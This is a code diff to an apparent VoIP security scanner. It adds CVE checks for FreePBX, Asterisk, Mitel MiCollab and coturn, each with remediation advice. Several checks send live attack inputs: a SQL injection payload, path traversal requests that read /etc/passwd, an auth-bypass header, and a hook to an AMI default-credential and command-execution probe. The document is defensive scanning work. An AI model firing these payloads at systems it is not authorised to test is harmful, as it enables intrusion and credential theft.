@@ -52,6 +52,7 @@ def _http_get(
     path: str,
     timeout: float = 3.0,
     use_tls: bool = False,
+    extra_headers: dict[str, str] | None = None,
 ) -> tuple[int, dict[str, str], str]:
     """Perform an HTTP GET.
 
@@ -67,11 +68,16 @@ def _http_get(
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
             s = ctx.wrap_socket(s, server_hostname=host)
+        extra = ""
+        if extra_headers:
+            for k, v in extra_headers.items():
+                extra += f"{k}: {v}\r\n"
         request = (
             f"GET {path} HTTP/1.0\r\n"
             f"Host: {host}\r\n"
             "User-Agent: Mozilla/5.0 VoIPScan/4.0\r\n"
             "Accept: */*\r\n"
+            f"{extra}"
             "\r\n"
         )
         s.sendall(request.encode("utf-8"))
@@ -184,7 +190,7 @@ _FPBX_VER_RE = re.compile(
     r"|FreePBX[\s/]+([\d]+\.[\d]+\.[\d]+(?:\.[\d]+)?)",
     re.I,
 )
-_AST_VER_RE = re.compile(r"Asterisk[\s/]+([\d]+\.[\d]+\.[\d]+(?:\.[\d]+)?)", re.I)
+_AST_VER_RE = re.compile(r"Asterisk[\s/]+(?:PBX\s+)?([\d]+\.[\d]+\.[\d]+(?:\.[\d]+)?)", re.I)
 
 
 def _extract_fpbx_version(text: str) -> str:
@@ -298,14 +304,20 @@ def check_freepbx_cve_2021_45461(
     use_tls: bool = False,
     timeout: float = 3.0,
 ) -> CveResult | None:
-    """CVE-2021-45461: FreePBX dashboard SQL injection indicator.
+    """CVE-2021-45461: FreePBX voicemail SQL injection indicator.
 
-    GET /admin/ajax.php?module=dashboard&command=getSummary
+    POST /admin/ajax.php?module=voicemail&command=getSIPCredentials with id=1'+OR+'1'='1
     Detection: SQL error string present in response body.
     Severity: HIGH
     """
-    path = "/admin/ajax.php?module=dashboard&command=getSummary"
-    status, _headers, body = _http_get(host, port, path, timeout, use_tls)
+    path = "/admin/ajax.php?module=voicemail&command=getSIPCredentials"
+    post_body = "id=1'+OR+'1'='1"
+    status, _headers, body = _http_post(
+        host, port, path, post_body,
+        content_type="application/x-www-form-urlencoded",
+        timeout=timeout,
+        use_tls=use_tls,
+    )
     if status == 0:
         return None
 
@@ -319,7 +331,6 @@ def check_freepbx_cve_2021_45461(
         "supplied argument is not a valid mysql",
         "ora-01756",
         "odbc microsoft access",
-        "sqlite_master",
         "pg_query",
         "syntax error at or near",
         "unterminated string constant",
@@ -330,6 +341,11 @@ def check_freepbx_cve_2021_45461(
         return None
 
     ver = _extract_fpbx_version(body)
+    confirmed = True
+    if ver:
+        vulnerable = _version_lt(ver, "15.0.21.4") or _version_lt(ver, "16.0.10.41")
+        if not vulnerable:
+            confirmed = False
 
     return CveResult(
         cve_id="CVE-2021-45461",
@@ -337,9 +353,10 @@ def check_freepbx_cve_2021_45461(
         severity="high",
         host=host,
         port=port,
-        title="CVE-2021-45461: FreePBX dashboard endpoint returns SQL error strings",
+        title="CVE-2021-45461: FreePBX voicemail endpoint returns SQL error strings",
         evidence=(
-            f"GET {path} returned HTTP {status} with SQL error indicators in the response. "
+            f"POST {path} with SQL injection payload returned HTTP {status} "
+            f"with SQL error indicators in the response. "
             f"Matched patterns: {found_errors}. "
             f"Body snippet: {body[:300]!r}"
         ),
@@ -352,6 +369,7 @@ def check_freepbx_cve_2021_45461(
         references=[
             "https://nvd.nist.gov/vuln/detail/CVE-2021-45461",
         ],
+        confirmed=confirmed,
     )
 
 
@@ -376,19 +394,13 @@ def check_freepbx_path_traversal(
     if status == 0:
         return None
 
-    if "root:" not in body:
+    if not re.search(r"root:[x*!]?:[0-9]+:[0-9]+:", body):
         return None
-
-    # Confirm it looks like /etc/passwd content
-    has_passwd_content = bool(re.search(r"root:[x*!]?:[0-9]+:[0-9]+:", body))
-    if not has_passwd_content:
-        # 'root:' appeared but not in passwd format — still flag if the string is present
-        pass
 
     evidence_snippet = body[:400].replace("\n", "\\n")
 
     return CveResult(
-        cve_id="CVE-PATH-TRAVERSAL-FREEPBX",
+        cve_id="CONFIG-FREEPBX-PATH-TRAVERSAL",
         platform="FreePBX",
         severity="critical",
         host=host,
@@ -396,7 +408,7 @@ def check_freepbx_path_traversal(
         title="FreePBX filestore module path traversal — /etc/passwd disclosed",
         evidence=(
             f"GET {path} returned HTTP {status} and the response contains "
-            f"'root:' consistent with /etc/passwd content. "
+            f"/etc/passwd content (root entry regex matched). "
             f"Body snippet: {evidence_snippet!r}"
         ),
         remediation=(
@@ -408,6 +420,8 @@ def check_freepbx_path_traversal(
         ),
         references=[
             "https://nvd.nist.gov/vuln/detail/CVE-2022-2347",
+            "Note: this probe detects unauthenticated path traversal distinct from "
+            "CVE-2022-2347, which requires authentication; upgrade and restrict access.",
         ],
     )
 
@@ -907,36 +921,126 @@ def check_sip_version_disclosure(
     # Check Asterisk version
     ast_ver = _extract_asterisk_version(sip_server)
     if ast_ver:
-        if _version_lt(ast_ver, "18.12.0"):
-            results.append(
-                CveResult(
-                    cve_id="AST-2022-MULTIPLE",
-                    platform="Asterisk",
-                    severity="critical",
-                    host=host,
-                    port=sip_port,
-                    title=f"Asterisk {ast_ver} is below 18.12.0 — multiple known CVEs [VERSION-BASED]",
-                    evidence=(
-                        f"SIP banner reveals Asterisk version {ast_ver!r} (from: {sip_server!r}). "
-                        "Asterisk versions below 18.12.0 are affected by multiple "
-                        "security advisories including AST-2022-002 (heap overflow in "
-                        "STIR/SHAKEN), AST-2022-006 (res_pjsip_t38 use-after-free), "
-                        "and AST-2022-008 (pjproject RTCP MR/SR overflow). "
-                        "[CVSS:9.8/CRITICAL CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]"
-                    ),
-                    remediation=(
-                        "Upgrade Asterisk to 18.12.0 or later (LTS branch). "
-                        "If using Asterisk 16 branch, upgrade to 16.26.0+. "
-                        "Review individual AST advisories at https://www.asterisk.org/asterisk-security-advisories/"
-                    ),
-                    affected_version=ast_ver,
-                    references=[
-                        "https://www.asterisk.org/asterisk-security-advisories/",
-                        "https://nvd.nist.gov/vuln/search/results?query=asterisk",
-                    ],
-                    confirmed=False,  # version-based: not live-exploited
+        try:
+            parts = [int(x) for x in ast_ver.split(".")]
+        except ValueError:
+            parts = []
+        # Require at least major.minor to avoid false-positives on bare "Asterisk 20" banners
+        if len(parts) >= 2:
+            major = parts[0]
+            if major <= 19:
+                results.append(
+                    CveResult(
+                        cve_id="CONFIG-ASTERISK-EOL",
+                        platform="Asterisk",
+                        severity="critical",
+                        host=host,
+                        port=sip_port,
+                        title=f"Asterisk {ast_ver} is end-of-life and no longer receives security updates",
+                        evidence=(
+                            f"SIP banner reveals Asterisk version {ast_ver!r} (from: {sip_server!r}). "
+                            f"Asterisk {major}.x has reached end-of-life and no longer receives "
+                            "security patches. All known and future CVEs remain unaddressed."
+                        ),
+                        remediation=(
+                            "Upgrade to Asterisk 20 LTS (>=20.15.2) or Asterisk 22 (>=22.5.2). "
+                            "Review https://www.asterisk.org/asterisk-security-advisories/ for "
+                            "advisories affecting the installed branch."
+                        ),
+                        affected_version=ast_ver,
+                        references=[
+                            "https://www.asterisk.org/asterisk-security-advisories/",
+                            "https://wiki.asterisk.org/wiki/display/AST/Asterisk+Versions",
+                        ],
+                        confirmed=False,
+                    )
                 )
-            )
+            elif major == 20 and _version_lt(ast_ver, "20.15.2"):
+                results.append(
+                    CveResult(
+                        cve_id="CVE-2025-57767",
+                        platform="Asterisk",
+                        severity="critical",
+                        host=host,
+                        port=sip_port,
+                        title=f"Asterisk {ast_ver} is below 20.15.2 — CVE-2025-57767, AST-2022-002 (CVE-2022-26498) [VERSION-BASED]",
+                        evidence=(
+                            f"SIP banner reveals Asterisk version {ast_ver!r} (from: {sip_server!r}). "
+                            "Asterisk 20.x below 20.15.2 is affected by CVE-2025-57767 "
+                            "(NULL pointer dereference in SIP digest auth, CVSS 7.5) and "
+                            "AST-2022-002/CVE-2022-26498 (heap overflow in STIR/SHAKEN). "
+                            "[CVSS:9.8/CRITICAL CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]"
+                        ),
+                        remediation=(
+                            "Upgrade Asterisk to 20.15.2 or later (LTS branch), "
+                            "or migrate to Asterisk 22 (>=22.5.2). "
+                            "Review https://www.asterisk.org/asterisk-security-advisories/"
+                        ),
+                        affected_version=ast_ver,
+                        references=[
+                            "https://nvd.nist.gov/vuln/detail/CVE-2025-57767",
+                            "https://nvd.nist.gov/vuln/detail/CVE-2022-26498",
+                            "https://www.asterisk.org/asterisk-security-advisories/",
+                        ],
+                        confirmed=False,
+                    )
+                )
+            elif major == 21 and _version_lt(ast_ver, "21.10.2"):
+                results.append(
+                    CveResult(
+                        cve_id="CVE-2025-57767",
+                        platform="Asterisk",
+                        severity="high",
+                        host=host,
+                        port=sip_port,
+                        title=f"Asterisk {ast_ver} is below 21.10.2 — CVE-2025-57767 [VERSION-BASED]",
+                        evidence=(
+                            f"SIP banner reveals Asterisk version {ast_ver!r} (from: {sip_server!r}). "
+                            "Asterisk 21.x below 21.10.2 is affected by CVE-2025-57767 "
+                            "(NULL pointer dereference in SIP digest auth, remote DoS, CVSS 7.5). "
+                            "[CVSS:7.5/HIGH CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H]"
+                        ),
+                        remediation=(
+                            "Upgrade Asterisk to 21.10.2 or later, "
+                            "or migrate to Asterisk 20 LTS (>=20.15.2) or 22 (>=22.5.2). "
+                            "Review https://www.asterisk.org/asterisk-security-advisories/"
+                        ),
+                        affected_version=ast_ver,
+                        references=[
+                            "https://nvd.nist.gov/vuln/detail/CVE-2025-57767",
+                            "https://www.asterisk.org/asterisk-security-advisories/",
+                        ],
+                        confirmed=False,
+                    )
+                )
+            elif major == 22 and _version_lt(ast_ver, "22.5.2"):
+                results.append(
+                    CveResult(
+                        cve_id="CVE-2025-57767",
+                        platform="Asterisk",
+                        severity="high",
+                        host=host,
+                        port=sip_port,
+                        title=f"Asterisk {ast_ver} is below 22.5.2 — CVE-2025-57767 [VERSION-BASED]",
+                        evidence=(
+                            f"SIP banner reveals Asterisk version {ast_ver!r} (from: {sip_server!r}). "
+                            "Asterisk 22.x below 22.5.2 is affected by CVE-2025-57767 "
+                            "(NULL pointer dereference in SIP digest auth, remote DoS, CVSS 7.5). "
+                            "[CVSS:7.5/HIGH CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H]"
+                        ),
+                        remediation=(
+                            "Upgrade Asterisk to 22.5.2 or later, "
+                            "or use Asterisk 20 LTS (>=20.15.2). "
+                            "Review https://www.asterisk.org/asterisk-security-advisories/"
+                        ),
+                        affected_version=ast_ver,
+                        references=[
+                            "https://nvd.nist.gov/vuln/detail/CVE-2025-57767",
+                            "https://www.asterisk.org/asterisk-security-advisories/",
+                        ],
+                        confirmed=False,
+                    )
+                )
 
     # Check FreePBX version
     fpbx_ver = _extract_fpbx_version(sip_server)
@@ -1072,8 +1176,10 @@ def check_asterisk_cve_2025_57767(
         parts = [int(x) for x in ver_str.split(".")]
     except ValueError:
         return None
-    major = parts[0] if parts else 0
-    minor = parts[1] if len(parts) > 1 else 0
+    if len(parts) < 2:
+        return None
+    major = parts[0]
+    minor = parts[1]
     patch = parts[2] if len(parts) > 2 else 0
 
     vulnerable = (
@@ -1703,6 +1809,126 @@ def capture_cleartext_sip_evidence(
 
 
 # ---------------------------------------------------------------------------
+# Check 15: FreePBX CVE-2025-66039 — auth bypass in webserver auth mode
+# ---------------------------------------------------------------------------
+
+def check_freepbx_cve_2025_66039(
+    host: str,
+    port: int,
+    use_tls: bool = False,
+    timeout: float = 3.0,
+) -> "CveResult | None":
+    """CVE-2025-66039 (CVSS 9.8): FreePBX auth bypass in webserver auth mode.
+
+    When FreePBX is configured with 'webserver' auth mode, the admin panel
+    can be accessed with arbitrary Basic auth credentials. Sending a GET to
+    /admin/config.php with an invalid Authorization header still returns the
+    admin panel instead of a 401/403.
+
+    Affected: FreePBX < 16.0.44 / < 17.0.23 in webserver auth mode.
+    """
+    path = "/admin/config.php"
+    status, _hdrs, body = _http_get(
+        host, port, path, timeout, use_tls,
+        extra_headers={"Authorization": "Basic YWRtaW46aW52YWxpZA=="},
+    )
+    if status != 200:
+        return None
+    body_l = body.lower()
+    has_admin = "freepbx administration" in body_l or "admin panel" in body_l
+    if not has_admin:
+        return None
+    if re.search(r"<input[^>]*type[^>]*password", body_l):
+        return None
+    scheme = "https" if use_tls else "http"
+    return CveResult(
+        cve_id="CVE-2025-66039",
+        platform="FreePBX",
+        severity="critical",
+        host=host,
+        port=port,
+        title=(
+            "CVE-2025-66039: FreePBX admin panel accessible with invalid "
+            "credentials — auth bypass in webserver auth mode (CVSS 9.8)"
+        ),
+        evidence=(
+            f"GET {scheme}://{host}:{port}{path} with Authorization: Basic "
+            "YWRtaW46aW52YWxpZA== (admin:invalid) returned HTTP 200 with "
+            "admin panel content and no login form. "
+            f"Body excerpt: {body[:200].strip()}"
+        ),
+        remediation=(
+            "Upgrade FreePBX to >= 16.0.44 or >= 17.0.23. "
+            "Switch authentication mode away from 'webserver' auth in "
+            "Admin → Advanced Settings → Authorization Type. "
+            "Restrict /admin to localhost or VPN immediately."
+        ),
+        references=[
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-66039",
+            "https://www.freepbx.org/",
+        ],
+    )
+
+
+# ---------------------------------------------------------------------------
+# Check 16: Mitel CVE-2024-41713 — MiCollab path traversal
+# ---------------------------------------------------------------------------
+
+def check_mitel_cve_2024_41713(
+    host: str,
+    port: int = 443,
+    timeout: float = 3.0,
+) -> "CveResult | None":
+    """CVE-2024-41713 (CVSS 9.8): Mitel MiCollab NuPoint path traversal.
+
+    The NuPoint Unified Messaging component in Mitel MiCollab allows
+    unauthenticated path traversal via the /npm/webservice endpoint,
+    leading to arbitrary file read and potential RCE. Actively exploited
+    in the wild during 2024-2025.
+    """
+    paths = [
+        "/npm/webservice/..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "/npm/webservice/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    ]
+    passwd_re = re.compile(r"root:[x*!]?:[0-9]+:[0-9]+:")
+    for path in paths:
+        status, _hdrs, body = _http_get(host, port, path, timeout, use_tls=True)
+        if status == 0:
+            continue
+        if passwd_re.search(body):
+            return CveResult(
+                cve_id="CVE-2024-41713",
+                platform="Mitel",
+                severity="critical",
+                host=host,
+                port=port,
+                title=(
+                    "CVE-2024-41713: Mitel MiCollab NuPoint path traversal — "
+                    "/etc/passwd disclosed (CVSS 9.8, actively exploited 2024-2025)"
+                ),
+                evidence=(
+                    f"GET https://{host}:{port}{path} returned HTTP {status} "
+                    "and the response body contains /etc/passwd content "
+                    "(root entry regex matched). This confirms unauthenticated "
+                    "arbitrary file read via path traversal in NuPoint Unified "
+                    f"Messaging. Body excerpt: {body[:300].strip()}"
+                ),
+                remediation=(
+                    "Apply Mitel MiCollab security update R9.8 SP2 (December 2024) "
+                    "or later. Block external access to /npm/webservice/ at the "
+                    "perimeter firewall. Rotate all credentials on the affected system "
+                    "and treat it as potentially compromised."
+                ),
+                references=[
+                    "https://nvd.nist.gov/vuln/detail/CVE-2024-41713",
+                    "https://www.mitel.com/support/security-advisories",
+                    "https://www.watchtowr.com/mitel-micollab-cve-2024-41713/",
+                ],
+            )
+    return None
+
+
+# ---------------------------------------------------------------------------
 # Main entry point
 # ---------------------------------------------------------------------------
 
@@ -1713,6 +1939,7 @@ def check_all(
     sip_server: str = "",
     sip_port: int = 5060,
     timeout: float = 3.0,
+    turn_findings: list[dict] | None = None,
 ) -> list[CveResult]:
     """Run all applicable CVE and configuration checks against a discovered host.
 
@@ -1726,6 +1953,8 @@ def check_all(
                  Pass an empty string if not available.
     sip_port:    Port on which SIP was discovered (default 5060).
     timeout:     Per-probe TCP/HTTP timeout in seconds (default 3.0).
+    turn_findings: Pre-computed TURN probe results from probe_turn_open_relay
+                   and/or probe_turn_ipv4mapped_ssrf (optional).
 
     Returns
     -------
@@ -1753,6 +1982,9 @@ def check_all(
         kw in fp_lower for kw in ("grandstream", "ucm", "unknown")
     )
     is_3cx = not fingerprint or any(kw in fp_lower for kw in ("3cx", "unknown"))
+    is_mitel = not fingerprint or any(
+        kw in fp_lower for kw in ("mitel", "micollab", "unknown")
+    )
 
     # Check 1: FreePBX CVE-2019-19006
     if is_freepbx_or_asterisk:
@@ -1807,6 +2039,11 @@ def check_all(
     if r_ami:
         results.append(r_ami)
 
+    # Check 7b: AMI default-credential probe + command-execution PoC
+    if 5038 in tcp_ports:
+        from .ami import probe_ami_default_creds
+        results.extend(probe_ami_default_creds(host, port=5038, timeout=timeout))
+
     # Check 8: 3CX admin exposure
     if is_3cx:
         for port, use_tls in http_port_tls:
@@ -1841,6 +2078,20 @@ def check_all(
         if r:
             results.append(r)
 
+    # Check 15: CVE-2025-66039 — FreePBX auth bypass in webserver auth mode
+    if is_freepbx_or_asterisk:
+        for port, use_tls in http_port_tls:
+            r = check_freepbx_cve_2025_66039(host, port, use_tls, timeout)
+            if r:
+                results.append(r)
+                break
+
+    # Check 16: CVE-2024-41713 — Mitel MiCollab NuPoint path traversal
+    if is_mitel:
+        r = check_mitel_cve_2024_41713(host, 443, timeout)
+        if r:
+            results.append(r)
+
     # Check 13: Unencrypted SIP signaling (no TLS on 5061)
     # Only meaningful when SIP is actually responding — skip if no banner detected.
     if sip_server or sip_port in tcp_ports:
@@ -1852,6 +2103,64 @@ def check_all(
     if sip_server or any(p in tcp_ports for p in (8088, 8089, 5066)):
         wss_results = check_sip_wss_security(host, tcp_ports, timeout)
         results.extend(wss_results)
+
+    # TURN open-relay and STUN amplification findings
+    for tf in (turn_findings or []):
+        sev = tf.get("severity", "")
+        if not sev or sev == "info":
+            continue
+        evidence = tf.get("evidence", "")
+        if tf.get("open_relay"):
+            results.append(CveResult(
+                cve_id="CONFIG-TURN-OPEN-RELAY",
+                platform="Generic",
+                severity="critical",
+                host=host,
+                port=3478,
+                title="TURN server is an open relay — unauthenticated allocation permitted",
+                evidence=evidence,
+                remediation=(
+                    "Require authentication on all TURN Allocate requests. "
+                    "In coturn: set use-auth-secret or lt-cred-mech. "
+                    "Never expose TURN/3478 to the internet without credentials."
+                ),
+                references=["https://datatracker.ietf.org/doc/html/rfc5766"],
+            ))
+        elif tf.get("stun_amp"):
+            results.append(CveResult(
+                cve_id="CONFIG-STUN-AMPLIFICATION",
+                platform="Generic",
+                severity="medium",
+                host=host,
+                port=3478,
+                title="STUN server responds to spoofed source — DDoS amplification risk",
+                evidence=evidence,
+                remediation=(
+                    "Rate-limit STUN Binding Responses per source IP. "
+                    "Deploy BCP 38 egress filtering. "
+                    "If STUN is not required publicly, firewall UDP/3478."
+                ),
+                references=["https://datatracker.ietf.org/doc/html/rfc5389"],
+            ))
+        elif tf.get("ssrf_confirmed"):
+            results.append(CveResult(
+                cve_id="CVE-2026-27624",
+                platform="Generic",
+                severity="high",
+                host=host,
+                port=3478,
+                title=(
+                    "CVE-2026-27624: coturn SSRF bypass via IPv4-mapped IPv6 "
+                    "loopback in CreatePermission (CVSS 7.5)"
+                ),
+                evidence=evidence,
+                remediation=(
+                    "Upgrade coturn to a version with CVE-2026-27624 fix. "
+                    "Block relay to loopback/RFC-1918 addresses in coturn "
+                    "configuration: set no-loopback-peers and no-multicast-peers."
+                ),
+                references=["https://nvd.nist.gov/vuln/detail/CVE-2026-27624"],
+            ))
 
     # Deduplicate by (cve_id, host, port)
     seen: set[tuple[str, str, int]] = set()
